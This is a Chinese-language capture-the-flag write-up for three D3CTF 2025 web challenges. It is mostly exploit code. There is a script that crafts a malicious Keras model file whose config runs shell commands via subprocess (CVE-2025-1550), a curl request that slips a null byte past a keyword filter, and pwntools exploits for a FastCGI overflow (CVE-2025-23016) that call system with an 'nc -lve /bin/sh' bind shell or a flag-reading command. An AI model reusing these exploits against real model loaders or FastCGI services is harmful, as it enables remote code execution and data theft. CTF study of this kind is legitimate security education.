+++
title = "D3CTF2025"
slug = "d3ctf2025"
description = "m4x哥好强"
date = "2025-05-30T21:50:09"
lastmod = "2025-05-30T21:50:09"
image = ""
license = ""
categories = ["赛题"]
tags = []
+++

## **d3model**

```python
import keras
from flask import Flask, request, jsonify
import os


def is_valid_model(modelname):
    try:
        keras.models.load_model(modelname)
    except:
        return False
    return True

app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    return open('index.html').read()


@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    
    file = request.files['file']
    
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    
    MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB
    file.seek(0, os.SEEK_END)
    file_size = file.tell()
    file.seek(0)
    
    if file_size > MAX_FILE_SIZE:
        return jsonify({'error': 'File size exceeds 50MB limit'}), 400
    
    filepath = os.path.join('./', 'test.keras')
    if os.path.exists(filepath):
        os.remove(filepath)
    file.save(filepath)
    
    if is_valid_model(filepath):
        return jsonify({'message': 'Model is valid'}), 200
    else:
        return jsonify({'error': 'Invalid model file'}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

```

可以进行反序列化RCE，文章 https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models  直接用花哥的exp了

```python
import zipfile
import json
from keras.models import Sequential
from keras.layers import Dense
import numpy as np
import os
model_name="model.keras"

x_train = np.random.rand(100, 28*28)  
y_train = np.random.rand(100) 

model = Sequential([Dense(1, activation='linear', input_dim=28*28)])

model.compile(optimizer='adam', loss='mse')
model.fit(x_train, y_train, epochs=5)
model.save(model_name)

with zipfile.ZipFile(model_name,"r") as f:
    config=json.loads(f.read("config.json").decode())
    
config["config"]["layers"][0]["module"]="keras.models"
config["config"]["layers"][0]["class_name"]="Model"
config["config"]["layers"][0]["config"]={
    "name":"mvlttt",
    "layers":[
        {
            "name":"mvlttt",
            "class_name":"function",
            "config":"Popen",
            "module": "subprocess",
            "inbound_nodes":[{"args":[["bash","-c","env>/app/index.html"]],"kwargs":{"bufsize":-1}}]
        }],
            "input_layers":[["mvlttt", 0, 0]],
            "output_layers":[["mvlttt", 0, 0]]
        }

with zipfile.ZipFile(model_name, 'r') as zip_read:
    with zipfile.ZipFile(f"tmp.{model_name}", 'w') as zip_write:
        for item in zip_read.infolist():
            if item.filename != "config.json":
                zip_write.writestr(item, zip_read.read(item.filename))

os.remove(model_name)
os.rename(f"tmp.{model_name}",model_name)


with zipfile.ZipFile(model_name,"a") as zf:
        zf.writestr("config.json",json.dumps(config))

print("[+] Malicious model ready")
```

## **tidy quic**

```go
package main

import (
	"bytes"
	"errors"
	"github.com/libp2p/go-buffer-pool"
	"github.com/quic-go/quic-go/http3"
	"io"
	"log"
	"net/http"
	"os"
)

var p pool.BufferPool
var ErrWAF = errors.New("WAF")

func main() {
	go func() {
		err := http.ListenAndServeTLS(":8080", "./server.crt", "./server.key", &mux{})
		log.Fatalln(err)
	}()
	go func() {
		err := http3.ListenAndServeQUIC(":8080", "./server.crt", "./server.key", &mux{})
		log.Fatalln(err)
	}()
	select {}
}

type mux struct {
}

func (*mux) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		_, _ = w.Write([]byte("Hello D^3CTF 2025,I'm tidy quic in web."))
		return
	}
	if r.Method != http.MethodPost {
		w.WriteHeader(400)
		return
	}

	var buf []byte
	length := int(r.ContentLength)
	if length == -1 {
		var err error
		buf, err = io.ReadAll(textInterrupterWrap(r.Body))
		if err != nil {
			if errors.Is(err, ErrWAF) {
				w.WriteHeader(400)
				_, _ = w.Write([]byte("WAF"))
			} else {
				w.WriteHeader(500)
				_, _ = w.Write([]byte("error"))
			}
			return
		}
	} else {
		buf = p.Get(length)
		defer p.Put(buf)
		rd := textInterrupterWrap(r.Body)
		i := 0
		for {
			n, err := rd.Read(buf[i:])
			if err != nil {
				if errors.Is(err, io.EOF) {
					break
				} else if errors.Is(err, ErrWAF) {
					w.WriteHeader(400)
					_, _ = w.Write([]byte("WAF"))
					return
				} else {
					w.WriteHeader(500)
					_, _ = w.Write([]byte("error"))
					return
				}
			}
			i += n
		}
	}
	if !bytes.HasPrefix(buf, []byte("I want")) {
		_, _ = w.Write([]byte("Sorry I'm not clear what you want."))
		return
	}
	item := bytes.TrimSpace(bytes.TrimPrefix(buf, []byte("I want")))
	if bytes.Equal(item, []byte("flag")) {
		_, _ = w.Write([]byte(os.Getenv("FLAG")))
	} else {
		_, _ = w.Write(item)
	}
}

type wrap struct {
	io.ReadCloser
	ban []byte
	idx int
}

func (w *wrap) Read(p []byte) (int, error) {
	n, err := w.ReadCloser.Read(p)
	if err != nil && !errors.Is(err, io.EOF) {
		return n, err
	}
	for i := 0; i < n; i++ {
		if p[i] == w.ban[w.idx] {
			w.idx++
			if w.idx == len(w.ban) {
				return n, ErrWAF
			}
		} else {
			w.idx = 0
		}
	}
	return n, err
}

func textInterrupterWrap(rc io.ReadCloser) io.ReadCloser {
	return &wrap{
		rc, []byte("flag"), 0,
	}
}
```

起初我看到这题，我以为要进行请求走私，一直在搜索这个框架有没有类似的NDAY然后再进行修改来绕过，但是没找到相关资料，我们的目标就是POST一个`I want flag`但是后续内容如果被提取成flag就会寄，后面发现用`\0`绕过即可，使用curl进行http3请求会比较方便，当然你也可以写python脚本，看自己选择了  https://curl.se/windows/

```bash
x=$'I want \0flag'
curl -X POST https://35.241.98.126:31956 -d "$x" -v --insecure --http3 -H "Content-Length: 11"
```

## **d3cgi**

https://www.synacktiv.com/publications/cve-2025-23016-exploiter-la-bibliotheque-fastcgi.html#exploitation

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./challenge')

def start(argv=[], *a, **kw):
    return remote("35.220.136.70",30369)

"""
typedef struct {
    unsigned char version;
    unsigned char type;
    unsigned char requestIdB1;
    unsigned char requestIdB0;
    unsigned char contentLengthB1;
    unsigned char contentLengthB0;
    unsigned char paddingLength;
    unsigned char reserved;
} FCGI_Header;
"""

def makeHeader(type, requestId, contentLength, paddingLength):
    header = p8(1) + p8(type) + p16(requestId) + p16(contentLength)[::-1] + p8(paddingLength) + p8(0)
    return header

"""
typedef struct {
    unsigned char roleB1;
    unsigned char roleB0;
    unsigned char flags;
    unsigned char reserved[5];
} FCGI_BeginRequestBody;
"""

def makeBeginReqBody(role, flags):
    return p16(role)[::-1] + p8(flags) + b"\x00" * 5

io = start()

header = makeHeader(9, 0, 900, 0)

print(hex(exe.plt["system"]))
io.send(makeHeader(1, 1, 8, 0) + makeBeginReqBody(1, 0) + header + (p8(0x13) + p8(0x13) + b"b" * 0x26)*9 + p8(0) * (2 *2)+ p32(0xffffffff) + p32(0xffffffff)  + b"a" * (4 * 4) + b" /bi;nc -lve /bin/sh" +p32(0) * 3 + p32(exe.plt["system"]) )

io.close()
```

显示是执行成功了，但是TM的我shell呢，后来得知貌似是不出网的，也就是说我们需要直接去命令执行攻击

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./challenge')

def start(argv=[], *a, **kw):
    return remote("35.241.98.126",30556)

"""
typedef struct {
    unsigned char version;
    unsigned char type;
    unsigned char requestIdB1;
    unsigned char requestIdB0;
    unsigned char contentLengthB1;
    unsigned char contentLengthB0;
    unsigned char paddingLength;
    unsigned char reserved;
} FCGI_Header;
"""

def makeHeader(type, requestId, contentLength, paddingLength):
    header = p8(1) + p8(type) + p16(requestId) + p16(contentLength)[::-1] + p8(paddingLength) + p8(0)
    return header

"""
typedef struct {
    unsigned char roleB1;
    unsigned char roleB0;
    unsigned char flags;
    unsigned char reserved[5];
} FCGI_BeginRequestBody;
"""

def makeBeginReqBody(role, flags):
    return p16(role)[::-1] + p8(flags) + b"\x00" * 5

io = start()

header = makeHeader(9, 0, 900, 0)

print(hex(exe.plt["system"]))
io.send(makeHeader(1, 1, 8, 0) + makeBeginReqBody(1, 0) + header + (p8(0x13) + p8(0x13) + b"b" * 0x26)*9 + p8(0) * (2 *2)+ p32(0xffffffff) + p32(0xffffffff)  + b"a" * (4 * 4) + b" /bi;cat .//fl* 1>&3" +p32(0) * 3 + p32(exe.plt["system"]) )

io.interactive ()
```

但是依然没有成功，其实仔细看文章可以知道这东西必须访问web服务，才能正确触发

```
curl http://35.220.136.70:32665/

python3 1.py
```

依旧没有成功

